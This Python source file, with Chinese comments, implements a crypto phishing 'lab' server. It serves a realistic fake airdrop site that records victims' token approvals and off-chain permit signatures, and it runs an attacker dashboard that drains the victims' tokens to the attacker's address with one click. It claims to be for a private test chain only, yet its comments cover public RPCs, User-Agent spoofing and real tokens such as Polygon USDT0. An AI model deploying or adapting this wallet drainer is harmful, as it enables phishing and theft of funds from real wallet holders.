"""TrapLab 案例二:钓鱼实验室服务(Issue #59)。

一个进程同时扮演真实钓鱼攻击里的两个世界:
  - 受害者侧 GET /        —— 逼真的假空投站(配置注入,无任何演示字样)
  - 攻击者侧 GET /admin   —— 仪表盘:实时事件流、待收割清单、一键收割

安全边界:仅用于自有内网实验室(Anvil 测试链 + 公开测试私钥,零真实资产)。
配置读 config.yaml(模板见 config.example.yaml);缺项/非法值启动即报错(fail-closed)。

用法:
    cp phishlab/config.example.yaml phishlab/config.yaml   # 按需修改
    uv run python phishlab/phish_server.py --config phishlab/config.yaml
"""

import argparse
import importlib.util
import json
import pathlib
import sys
import threading
import urllib.error
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import yaml

_ROOT = pathlib.Path(__file__).resolve().parent.parent
_SPEC = importlib.util.spec_from_file_location("drain", _ROOT / "phishlab" / "drain.py")
drain = importlib.util.module_from_spec(_SPEC)
_SPEC.loader.exec_module(drain)

TEMPLATES = pathlib.Path(__file__).resolve().parent / "phish_templates"

REQUIRED_KEYS = {
    "attacker": ["address", "key"],
    "chain": ["rpc", "chain_id", "rpc_name"],
    "token": ["address", "name", "symbol"],
    "site": ["project", "tagline", "airdrop_amount", "countdown_minutes", "deadline"],
    "server": ["bind", "admin_key"],
}

TARGET_SECTIONS = ("chain", "token", "site")
PERMIT_ORDERS = ("deadline_first", "nonce_first")
TARGETS_DIR = pathlib.Path(__file__).resolve().parent / "targets"


def load_target(name: str) -> dict:
    """读目标档案(phishlab/targets/<name>.yaml,含 chain+token+site 三段实测值)。"""
    # 档案名只允许安全字符,防路径穿越
    if not (name and all(c.isalnum() or c in "-_" for c in name)):
        raise SystemExit(f"[!] 非法目标档案名: {name!r}(只允许字母数字-_)")
    path = TARGETS_DIR / f"{name}.yaml"
    try:
        target = yaml.safe_load(path.read_text(encoding="utf-8"))
    except FileNotFoundError:
        known = sorted(p.stem for p in TARGETS_DIR.glob("*.yaml")) if TARGETS_DIR.exists() else []
        raise SystemExit(f"[!] 目标档案不存在: {path}(已有: {', '.join(known) or '无'})")
    except yaml.YAMLError as exc:
        raise SystemExit(f"[!] 目标档案不是合法 YAML: {exc}")
    if not isinstance(target, dict):
        raise SystemExit(f"[!] 目标档案必须是 YAML 映射: {path}")
    unknown = set(target) - set(TARGET_SECTIONS)
    if unknown:
        raise SystemExit(
            f"[!] 目标档案 {path} 含未知节 {sorted(unknown)}(只允许: {', '.join(TARGET_SECTIONS)};"
            f"是 tokens 这类拼写笔误?字段(如 permit_order)应在 token 节内)")
    for section in TARGET_SECTIONS:
        if not isinstance(target.get(section), dict):
            raise SystemExit(f"[!] 目标档案 {name}.yaml 缺少节 [{section}]")
    return target


def load_config(path: str) -> dict:
    """读配置并 fail-closed 校验:缺项/非法值一律拒绝启动。

    两种形态:
    - 目标档案式:config 含 `target: <名>`,chain/token/site 从 phishlab/targets/<名>.yaml 合并
    - 兼容旧式:chain/token/site 直接内联在 config 里(不允许与 target 同时出现)
    """
    try:
        cfg = yaml.safe_load(pathlib.Path(path).read_text(encoding="utf-8"))
    except FileNotFoundError:
        raise SystemExit(f"[!] 配置文件不存在: {path}(模板见 phishlab/config.example.yaml)")
    except yaml.YAMLError as exc:
        raise SystemExit(f"[!] 配置不是合法 YAML: {exc}")
    if not isinstance(cfg, dict):
        raise SystemExit("[!] 配置必须是 YAML 映射")
    if "target" in cfg:
        raw = cfg.pop("target")
        if not isinstance(raw, str) or not raw.strip():
            raise SystemExit("[!] target 应为档案名字符串(见 phishlab/targets/ 目录)")
        target_name = raw.strip()
        inline = [s for s in TARGET_SECTIONS if s in cfg]
        if inline:
            raise SystemExit(
                f"[!] target 与内联节 {inline} 不可同时出现(目标档案机制见 phishlab/targets/)")
        cfg.update(load_target(target_name))
    for section, keys in REQUIRED_KEYS.items():
        if section not in cfg or not isinstance(cfg[section], dict):
            raise SystemExit(f"[!] 配置缺少节 [{section}]")
        for key in keys:
            value = cfg[section].get(key)
            if value is None or (isinstance(value, str) and not value.strip()):
                raise SystemExit(f"[!] 配置缺少 {section}.{key}(模板见 phishlab/config.example.yaml)")
    addr = cfg["attacker"]["address"]
    if not (addr.startswith("0x") and len(addr) == 42):
        raise SystemExit(f"[!] attacker.address 不是合法地址: {addr!r}")
    if not cfg["attacker"]["key"].startswith("0x"):
        raise SystemExit("[!] attacker.key 应为 0x 开头的私钥")
    if not (cfg["token"]["address"].startswith("0x") and len(cfg["token"]["address"]) == 42):
        raise SystemExit(f"[!] token.address 不是合法地址: {cfg['token']['address']!r}")
    if not isinstance(cfg["chain"]["chain_id"], int):
        raise SystemExit("[!] chain.chain_id 应为整数(如 31337)")
    if str(cfg["site"].get("claim_mode", "unlimited")) not in ("unlimited", "exact"):
        raise SystemExit('[!] site.claim_mode 只能是 "unlimited" 或 "exact"')
    if str(cfg["site"].get("style", "official")) not in ("official", "meme", "exchange"):
        raise SystemExit('[!] site.style 只能是 "official"、"meme" 或 "exchange"')
    if str(cfg["token"].get("permit_order", "deadline_first")) not in PERMIT_ORDERS:
        raise SystemExit(f'[!] token.permit_order 只能是 {" / ".join(PERMIT_ORDERS)}'
                         f'(写错会导致 permit 签名与合约 TYPEHASH 不一致且无诊断)')
    try:
        cfg["site"]["countdown_minutes"] = int(cfg["site"]["countdown_minutes"])
        cfg["site"]["deadline"] = int(cfg["site"]["deadline"])
    except (TypeError, ValueError):
        raise SystemExit("[!] site.countdown_minutes / site.deadline 应为整数")
    return cfg


def load_template(name: str) -> str:
    return (TEMPLATES / name).read_text(encoding="utf-8")


class EventStore:
    """线程安全的事件与待收割清单。"""

    def __init__(self):
        self.lock = threading.Lock()
        self.events = []   # 时间线:connect/approve/permit/drain
        self.items = {}    # item_id -> 待收割项
        self._next = 1

    def add_event(self, kind: str, text: str, victim: str | None = None) -> None:
        with self.lock:
            self.events.append({"kind": kind, "text": text, "victim": victim})
            self.events[:] = self.events[-200:]

    def add_item(self, item: dict) -> int:
        with self.lock:
            item_id = self._next
            self._next += 1
            item["id"] = item_id
            item["status"] = "pending"
            self.items[item_id] = item
            return item_id

    def get(self, item_id: int) -> dict | None:
        with self.lock:
            return self.items.get(item_id)

    def set_status(self, item_id: int, status: str, detail: str = "") -> None:
        with self.lock:
            item = self.items.get(item_id)
            if item:
                item["status"] = status
                item["detail"] = detail

    def last_victim(self) -> str | None:
        with self.lock:
            for ev in reversed(self.events):
                if ev.get("victim") and str(ev["victim"]).startswith("0x"):
                    return str(ev["victim"])
            for item in self.items.values():
                if str(item.get("victim", "")).startswith("0x"):
                    return str(item["victim"])
        return None

    def claim_for_drain(self, item_id: int) -> dict | None:
        """原子地把 pending 置为 running,防并发重复收割;非 pending 返回 None。"""
        with self.lock:
            item = self.items.get(item_id)
            if not item or item["status"] != "pending":
                return None
            item["status"] = "running"
            return dict(item)

    def snapshot(self) -> dict:
        with self.lock:
            return {
                "events": list(self.events),
                "items": sorted(self.items.values(), key=lambda x: -x["id"]),
            }


STORE = EventStore()


def rpc_call(url: str, method: str, params):
    payload = json.dumps({"jsonrpc": "2.0", "id": 1, "method": method, "params": params}).encode()
    # 公共 RPC(Cloudflare)默认拦 python-urllib 的 UA,必须伪装成浏览器
    req = urllib.request.Request(url, data=payload, headers={
        "Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"})
    with urllib.request.urlopen(req, timeout=15) as resp:
        out = json.loads(resp.read())
    if "error" in out:
        raise RuntimeError(f"RPC 错误: {out['error']}")
    return out["result"]


def token_nonce(cfg: dict, owner: str):
    """读代币合约 nonces(owner);链不可达返回 None(调用方自行降级)。Ref #75"""
    data = "0x7ecebe00" + _addr_word(owner)
    try:
        out = drain.rpc(cfg["chain"]["rpc"], "eth_call",
                        [{"to": cfg["token"]["address"], "data": data}, "latest"])
        return int(out, 16) if out and out != "0x" else None
    except Exception:
        return None


def token_allowance(cfg: dict, owner: str, spender: str):
    """读代币合约 allowance(owner, spender);链不可达返回 None。"""
    data = "0xdd62ed3e" + _addr_word(owner) + _addr_word(spender)
    try:
        out = drain.rpc(cfg["chain"]["rpc"], "eth_call",
                        [{"to": cfg["token"]["address"], "data": data}, "latest"])
        return int(out, 16) if out and out != "0x" else None
    except Exception:
        return None


def _addr_word(addr: str) -> str:
    return addr.lower().removeprefix("0x").rjust(64, "0")


def item_balances(cfg: dict, victim: str) -> dict:
    return {
        "victim": drain.balance_of(cfg["chain"]["rpc"], cfg["token"]["address"], victim),
        "attacker": drain.balance_of(cfg["chain"]["rpc"], cfg["token"]["address"],
                                     cfg["attacker"]["address"]),
    }


def run_drain(cfg: dict, item: dict) -> dict:
    """按待收割项类型执行收割,返回余额前后对比。attacker 全程来自 config。"""
    rpc = cfg["chain"]["rpc"]
    token = cfg["token"]["address"]
    key = cfg["attacker"]["key"]
    attacker = cfg["attacker"]["address"]
    victim = item["victim"]
    before = item_balances(cfg, victim)
    if item["type"] == "approve":
        amount = min(item["amount"], before["victim"])
        if amount == 0:
            raise RuntimeError("授权额度或余额为 0,无可收割")
        drain.drain(rpc, token, victim, amount, key, attacker)
    else:  # permit:先用受害者离线签名上链,再收割
        # Ref #75:nonce 已推进(或授权已存在)时签名必 revert,给可读错误而非裸 revert
        chain_nonce = token_nonce(cfg, victim)
        if chain_nonce is not None and chain_nonce != item["nonce"]:
            allowance = token_allowance(cfg, victim, attacker)
            hint = (f";且 allowance={allowance} 仍在,可直接 transferFrom 收割,无需重新签名"
                    if allowance else ";需受害者重新签名")
            raise RuntimeError(f"permit 签名 nonce 过期:签名 nonce={item['nonce']},"
                               f"链上当前 {chain_nonce}{hint}")
        v, r, s = drain.parse_permit_sig(item["sig"])
        data = (drain.PERMIT + drain._word(victim) + drain._word(attacker)
                + drain._word(hex(item["value"])[2:]) + drain._word(hex(item["deadline"])[2:])
                + drain._word(hex(v)[2:]) + r + s)
        drain.send(rpc, token, data, key)
        amount = min(item["value"], before["victim"])
        if amount:
            drain.drain(rpc, token, victim, amount, key, attacker)
    after = item_balances(cfg, victim)
    return {"before": before, "after": after, "drained": before["victim"] - after["victim"]}


class Handler(BaseHTTPRequestHandler):
    cfg: dict = {}

    def log_message(self, fmt, *args):  # 安静模式:不把每个请求打进受害者终端
        pass

    # ---- helpers ----

    def _send(self, status: int, body: bytes, ctype: str) -> None:
        self.send_response(status)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _json(self, status: int, obj) -> None:
        self._send(status, json.dumps(obj, ensure_ascii=False).encode("utf-8"),
                   "application/json; charset=utf-8")

    def _html(self, status: int, text: str) -> None:
        self._send(status, text.encode("utf-8"), "text/html; charset=utf-8")

    def _body(self) -> dict:
        length = int(self.headers.get("Content-Length") or 0)
        if not length:
            return {}
        try:
            return json.loads(self.rfile.read(length).decode("utf-8", "replace"))
        except json.JSONDecodeError:
            return {}

    def _admin_ok(self) -> bool:
        import hmac
        from urllib.parse import parse_qs, urlparse
        query = parse_qs(urlparse(self.path).query).get("key", [""])[0]
        return hmac.compare_digest(query, self.cfg["server"]["admin_key"])

    # ---- routes ----

    def do_GET(self):
        path = self.path.split("?")[0]
        if path == "/admin" and not self._admin_ok():
            self._html(403, "<h1>403</h1><p>需要访问口令:/admin?key=你的口令</p>")
        elif path == "/admin":
            self._html(200, load_template("admin.html"))
        elif path == "/admin/api/state" and not self._admin_ok():
            self._json(403, {"error": "需要口令"})
        elif path == "/admin/api/state":
            self._json(200, self._state_with_balances())
        elif path == "/" or path.startswith("/index"):
            site = self.cfg["site"]
            skin = {"official": "site_official.html", "meme": "site_meme.html",
                    "exchange": "site_exchange.html"}[site["style"]]
            page = (load_template(skin)
                    .replace("__PROJECT__", str(site["project"]))
                    .replace("__TAGLINE__", str(site["tagline"]))
                    .replace("__AMOUNT__", str(site["airdrop_amount"]))
                    .replace("__SYMBOL__", str(self.cfg["token"]["symbol"]))
                    .replace("__GASLESS__", str(site.get("gasless_text", "免 Gas 领取")))
                    .replace("__TOKEN_NAME__", str(self.cfg["token"]["name"])))
            if not site.get("show_gasless", True):
                # permit 不适用的代币(如 Polygon USDT0 的 salted domain)隐藏免 Gas 入口
                page = page.replace('id="gaslessBtn"', 'id="gaslessBtn" style="display:none"')
            self._html(200, page)
        elif path == "/app.js":
            page = (load_template("app.js")
                    .replace("__CONFIG_JSON__", json.dumps({
                    "rpc": self.cfg["chain"]["rpc"],
                    "chain_id": self.cfg["chain"]["chain_id"],
                    "rpc_name": self.cfg["chain"]["rpc_name"],
                    "token": self.cfg["token"]["address"],
                    "token_name": self.cfg["token"]["name"],
                    "symbol": self.cfg["token"]["symbol"],
                    "attacker": self.cfg["attacker"]["address"],
                    "permit_version": str(self.cfg["token"].get("permit_version", "1")),
                    "permit_order": str(self.cfg["token"].get("permit_order", "deadline_first")),
                    "project": str(self.cfg["site"]["project"]),
                    "airdrop_amount": str(self.cfg["site"]["airdrop_amount"]),
                    "countdown_minutes": self.cfg["site"]["countdown_minutes"],
                    "deadline": self.cfg["site"]["deadline"],
                    "claim_mode": str(self.cfg["site"].get("claim_mode", "unlimited")),
                }, ensure_ascii=False)))
            self._send(200, page.encode("utf-8"), "application/javascript; charset=utf-8")
        else:
            self._json(404, {"error": "not found"})

    def do_POST(self):
        try:
            path = self.path.split("?")[0]
            if path == "/api/event":
                self._handle_event()
            elif path == "/admin/api/drain" and self._admin_ok():
                self._handle_drain()
            else:
                self._json(404, {"error": "not found"})
        except (BrokenPipeError, ConnectionResetError):
            pass
        except Exception as exc:  # 单个坏请求不崩服务
            STORE.add_event("error", f"请求处理异常: {exc!r}")
            self._json(500, {"error": str(exc)})

    def _handle_event(self):
        body = self._body()
        kind = body.get("type")
        if kind == "connect":
            addr = str(body.get("address", "?"))
            STORE.add_event("connect", f"受害者连接钱包: {addr}", victim=addr)
            self._json(200, {"ok": True})
        elif kind == "approve":
            txhash = str(body.get("txHash", ""))
            token = self.cfg["token"]["address"]
            tx = rpc_call(self.cfg["chain"]["rpc"], "eth_getTransactionByHash", [txhash])
            if not tx:
                self._json(400, {"error": "链上找不到交易"})
                return
            data = (tx.get("input") or "").removeprefix("0x")
            if not tx["to"] or tx["to"].lower() != token.lower() or not data.startswith(drain.APPROVE):
                self._json(400, {"error": "交易与配置的代币/授权不符"})
                return
            body_bytes = data[len(drain.APPROVE):]
            spender = "0x" + body_bytes[24:64]
            amount = int(body_bytes[64:128], 16)
            victim = tx["from"]
            flagged = spender.lower() != self.cfg["attacker"]["address"].lower()
            item_id = STORE.add_item({
                "type": "approve", "victim": victim, "spender": spender,
                "amount": amount, "tx": txhash,
            })
            STORE.add_event("approve",
                            f"受害者 {victim} 已签署授权(额度 {amount})"
                            + (f" ⚠ 授权对象非本站攻击者({spender})" if flagged else ""))
            self._json(200, {"ok": True, "itemId": item_id})
        elif kind == "permit":
            def _int(value, default=0):
                try:
                    return int(value, 0) if isinstance(value, str) else int(value)
                except (TypeError, ValueError):
                    return default
            chain_nonce = token_nonce(self.cfg, body.get("owner", "0x0"))
            if chain_nonce is not None and chain_nonce != _int(body.get("nonce")):
                # Ref #75:签名 nonce 与链上不一致,上链必 revert,直接拒收
                STORE.add_event("error",
                                f"拒收过期 permit 签名:受害者 {body.get('owner')} 签名 nonce="
                                f"{body.get('nonce')},链上已推进到 {chain_nonce}(需重新签名)")
                self._json(400, {"error": f"签名 nonce 过期:签名 nonce={body.get('nonce')},"
                                          f"链上当前 {chain_nonce},请重新签名"})
                return
            item_id = STORE.add_item({
                "type": "permit", "victim": body.get("owner", "?"),
                "sig": body.get("sig", ""), "value": _int(body.get("value")),
                "deadline": _int(body.get("deadline")),
                "nonce": _int(body.get("nonce")),
            })
            warn = "(⚠ 链不可达,未能校验 nonce)" if chain_nonce is None else ""
            STORE.add_event("permit",
                            f"受害者 {body.get('owner')} 已签署 permit 离线签名"
                            f"(额度 {body.get('value')},零交易、链上无痕迹){warn}")
            self._json(200, {"ok": True, "itemId": item_id})
        else:
            self._json(400, {"error": "未知事件类型"})

    def _state_with_balances(self) -> dict:
        state = STORE.snapshot()
        cfg = self.cfg
        rpc, token = cfg["chain"]["rpc"], cfg["token"]["address"]
        victim = STORE.last_victim()
        state["meta"] = {"symbol": cfg["token"]["symbol"],
                         "attacker": cfg["attacker"]["address"]}
        try:
            state["balances"] = {
                "attacker": drain.balance_of(rpc, token, cfg["attacker"]["address"]),
                "victim": ({"address": victim,
                            "amount": drain.balance_of(rpc, token, victim)}
                           if victim else None),
            }
        except Exception as exc:  # 链不可达:降级为 null,不把后台页面打死
            state["balances"] = None
            state["balance_error"] = f"余额查询失败(链不可达?): {exc}"
        return state

    def _handle_drain(self):
        body = self._body()
        if body.get("all"):
            pending = [i["id"] for i in STORE.snapshot()["items"] if i["status"] == "pending"]
            results = [self._drain_item_guarded(i) for i in pending]
            self._json(200, {"drained_count": sum(1 for r in results if "error" not in r),
                             "results": results})
            return
        item_id = int(body.get("itemId", 0))
        item = STORE.get(item_id)
        if not item:
            self._json(404, {"error": "待收割项不存在"})
            return
        self._json(200, self._drain_item_guarded(item_id))

    def _drain_item(self, claimed: dict) -> dict:
        result = run_drain(self.cfg, claimed)
        STORE.set_status(claimed["id"], "drained",
                         f"已收割 {result['drained']};受害者 {result['after']['victim']},"
                         f"攻击者 {result['after']['attacker']}")
        STORE.add_event("drain",
                        f"收割完成:受害者 -{result['drained']},"
                        f"攻击者现有 {result['after']['attacker']}")
        result["itemId"] = claimed["id"]
        return result

    def _drain_item_guarded(self, item_id: int) -> dict:
        """CAS 领取任务→执行→回写;任何异常都转成结构化错误,绝不中断批量。"""
        item = STORE.claim_for_drain(item_id)
        if not item:
            current = STORE.get(item_id)
            status = current["status"] if current else "不存在"
            return {"itemId": item_id, "error": f"状态为 {status},无法收割"}
        try:
            return self._drain_item(item)
        except Exception as exc:
            STORE.set_status(item_id, "pending", f"上次收割失败: {exc};可重试")
            STORE.add_event("error", f"收割 #{item_id} 失败: {exc}")
            return {"itemId": item_id, "error": str(exc)}


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--config", default=str(pathlib.Path(__file__).parent / "config.yaml"))
    args = ap.parse_args()
    cfg = load_config(args.config)
    Handler.cfg = cfg
    host, port = cfg["server"]["bind"].rsplit(":", 1)
    server = ThreadingHTTPServer((host, int(port)), Handler)
    print(f"[phish-lab] 假空投站(受害者)  http://{host}:{port}/")
    print(f"[phish-lab] 攻击者后台       http://{host}:{port}/admin?key=***")
    print(f"[phish-lab] 目标链 {cfg['chain']['rpc']} (chainId {cfg['chain']['chain_id']})"
          f" · 代币 {cfg['token']['symbol']} {cfg['token']['address']}")
    print(f"[phish-lab] ⚠ 仅限自有内网实验室演练,零真实资产", flush=True)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[phish-lab] 已停止", flush=True)
    finally:
        server.server_close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
